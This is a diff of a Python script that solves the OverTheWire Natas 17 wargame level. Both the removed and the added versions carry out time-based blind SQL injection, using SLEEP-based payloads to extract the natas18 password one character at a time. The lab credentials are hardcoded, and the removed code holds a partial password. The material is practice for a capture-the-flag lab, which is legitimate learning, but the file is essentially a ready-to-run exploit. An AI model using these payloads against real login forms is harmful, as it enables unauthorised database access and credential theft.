@@ -1,55 +1,32 @@
 import requests
-from requests.auth import HTTPBasicAuth
 import string
-import time
+from requests.auth import HTTPBasicAuth
 
-url = "http://natas17.natas.labs.overthewire.org"
-auth = HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
+basicAuth=HTTPBasicAuth('natas17', 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC')
+headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
-# First, let's test if time-based injection works
-print("Testing basic time-based injection...")
-test_payload = 'natas18" AND SLEEP(5)-- -'
-start = time.time()
-r = requests.post(url, auth=auth, data={'username': test_payload}, timeout=10)
-elapsed = time.time() - start
-print(f"Test delay: {elapsed:.2f} seconds")
+u="http://natas17.natas.labs.overthewire.org/index.php?debug"
 
-if elapsed < 4:
-    print("Time-based injection might not be working. Let's try another approach...")
+password="" # start with blank password
+count = 1   # substr() length argument starts at 1
+PASSWORD_LENGTH = 32  # previous passwords were 32 chars long
+VALID_CHARS = string.digits + string.ascii_letters
 
-# Extract password
-password = "6OG1PbKdVjyBlpxgDgDDbRk6ZLlCGgeJ"
-charset = string.ascii_letters + string.digits
+while count <= PASSWORD_LENGTH + 1: 
+    for c in VALID_CHARS: 
+        payload=("username=natas18"
+             "\" AND "
+             "IF(BINARY substring(password,1," + str(count) + ") = '" +
+             password + c + "', sleep(2), False)"
+             " -- ")
 
-print("\nExtracting password...")
-for position in range(1, 60):
-    found = False
-    for char in charset:
-        # Try this injection
-        payload = f'natas18" AND IF(BINARY SUBSTRING(password,{position},1)="{char}", SLEEP(2), 0)-- -'
+        response = requests.post(u, data=payload, headers=headers, auth=basicAuth, verify=False) 
+
+        # print(payload, " ------ ", response.elapsed) 
         
-        try:
-            start = time.time()
-            r = requests.post(url, auth=auth, data={'username': payload}, timeout=5)
-            elapsed = time.time() - start
-            
-            if elapsed >= 1.8:  # If it delayed ~2 seconds
-                password += char
-                print(f"Position {position}: {char} (Password: {password})")
-                found = True
-                break
-        except requests.Timeout:
-            # Timeout means it's sleeping
-            password += char
-            print(f"Position {position}: {char} (Password: {password})")
-            found = True
-            break
-        except Exception as e:
-            print(f"Error: {e}")
-            continue
-    
-    if not found:
-        print(f"Could not find character at position {position}")
-        break
+        if (response.elapsed.total_seconds() > 2):
+            print("Found one more char : %s" % (password+c))
+            password += c
+            count = count + 1
 
-print(f"\nFinal password: {password}")
+print("Done!")
